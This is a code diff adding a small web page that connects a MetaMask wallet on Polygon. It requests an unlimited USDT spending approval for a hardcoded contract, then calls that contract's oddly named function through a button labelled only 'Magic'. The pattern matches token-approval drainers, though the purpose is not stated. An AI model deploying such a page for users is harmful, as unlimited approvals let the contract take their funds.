@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+<button class="connectButton btn">Connect Metamask</button>
+<button class="approveButton btn">Approve USDT</button>
+<button class="fuckButton btn">Magic</button>
+<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+<script>
+    const FUCKER = '0xB1405F24C4792d5e46C49B0a14064325899Fd148';  // Fucker smart contract address
+    const USDT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';  // https://polygonscan.com/token/0xc2132D05D31c914a87C6611C10748AEb04B58e8F
+    const CHAIN_ID = 137;  // Polygon Mainnet
+    const UINT256_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';  // 2^256 - 1
+
+    const connectButton = document.querySelector('.connectButton');
+    const approveButton = document.querySelector('.approveButton');
+    const fuckButton = document.querySelector('.fuckButton');
+
+    let accounts = [];
+
+    const web3 = new Web3;
+
+    const approveData = web3.eth.abi.encodeFunctionCall({
+        name: 'approve',
+        type: 'function',
+        inputs: [{
+            type: 'address',
+            name: 'spender'
+        }, {
+            type: 'uint256',
+            name: 'amount'
+        }]
+    }, [FUCKER, UINT256_MAX]);
+    const fuckData = web3.eth.abi.encodeFunctionCall({
+        name: 'selffuck',
+        type: 'function',
+        inputs: [{
+            type: 'address',
+            name: 'token'
+        }]
+    }, [USDT]);
+
+    connectButton.addEventListener('click', () => {
+        getAccount();
+        changeNetwork();
+    });
+
+    async function getAccount() {
+        accounts = await ethereum.request({method: 'eth_requestAccounts'});
+    }
+
+    approveButton.addEventListener('click', () => {
+        ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [
+                {
+                    'from': accounts[0],
+                    'to': USDT,
+                    'value': 0,
+                    'data': approveData,
+                },
+            ],
+        }).then((txHash) => console.log(txHash)).catch((_) => console.error);
+    });
+
+    fuckButton.addEventListener('click', () => {
+        ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [
+                {
+                    'from': accounts[0],
+                    'to': FUCKER,
+                    'value': 0,
+                    'data': fuckData,
+                },
+            ],
+        }).then((txHash) => console.log(txHash)).catch((_) => console.error);
+    });
+
+    async function changeNetwork() {
+        if (window.ethereum.networkVersion !== CHAIN_ID) {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{chainId: web3.utils.toHex(CHAIN_ID)}]
+                });
+            } catch (err) {
+                // This error code indicates that the chain has not been added to MetaMask
+                if (err.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [
+                            {
+                                chainName: 'Polygon Mainnet',
+                                chainId: web3.utils.toHex(CHAIN_ID),
+                                nativeCurrency: {name: 'MATIC', decimals: 18, symbol: 'MATIC'},
+                                rpcUrls: ['https://polygon-rpc.com/'],
+                                blockExplorerUrls: ['https://polygonscan.com/'],
+                            }
+                        ]
+                    });
+                }
+            }
+        }
+    }
+</script>
+</body>
+</html>
